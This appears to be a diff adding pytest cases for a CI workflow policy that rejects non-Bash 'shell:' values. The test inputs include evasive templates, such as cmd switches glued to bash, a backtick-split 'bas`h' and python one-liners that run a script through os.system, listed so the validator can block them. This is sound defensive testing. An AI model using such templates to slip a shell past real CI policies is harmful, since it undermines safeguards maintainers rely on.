+        "pwsh.exe -NoProfile -Command \"& '{0}'\"",
+        "python3.exe {0}",
+    ],
+)
+def test_exe_suffixed_interpreters_are_never_tolerated(shell: str) -> None:
+    """An `.exe` first token misses the runner's extension table.
+
+    The runner names the temp script from a fixed table keyed on the first
+    token. `pwsh` yields `.ps1`, which PowerShell parses itself, but `pwsh.exe`
+    is absent from that table and yields a file with no extension, which
+    PowerShell hands to the OS. A `#!/bin/bash` body then runs under Bash while
+    the `shell:` value claims PowerShell. No workflow here uses an `.exe` form.
+    """
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "cmd",
+        "cmd /C",
+        "cmd /cbash {0}",
+        "cmd /kbash {0}",
+        'cmd "/cbash"',
+        "node",
+        "node {0}",
+        "ruby",
+        "perl",
+        "perl {0}",
+    ],
+)
+def test_interpreters_outside_the_allowlist_are_never_tolerated(shell: str) -> None:
+    """`cmd` glues its command to the switch and `perl` obeys a `#!` line.
+
+    Neither can be cleared by reading the `shell:` value, and neither is used in
+    this repository, so both stay outside the allowlist.
+    """
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "pwsh -Command bas`h {0}",
+        'pwsh -c "& $env:SHELL {0}"',
+        "python3 -c \"import os,sys; os.system('bas'+'h '+sys.argv[1])\" {0}",
+        'python3 -c "import os,sys;os.system(open(sys.argv[1]).read())" {0}',
+        'python3 -c "import subprocess,sys;subprocess.run(open(sys.argv[1]).read())" {0}',
+        "pwsh /cbash {0}",
+        "python3 --shell=bash {0}",
+    ],
+)
+def test_inline_programs_reaching_a_posix_shell_are_never_tolerated(shell: str) -> None:
+    """A template may reach `/bin/sh` without naming it, so only inert tokens pass."""
+    assert policy._is_non_bash_shell(shell) is False
 
 
 def test_resolve_bash_prefers_the_interpreter_on_path(monkeypatch: pytest.MonkeyPatch) -> None:
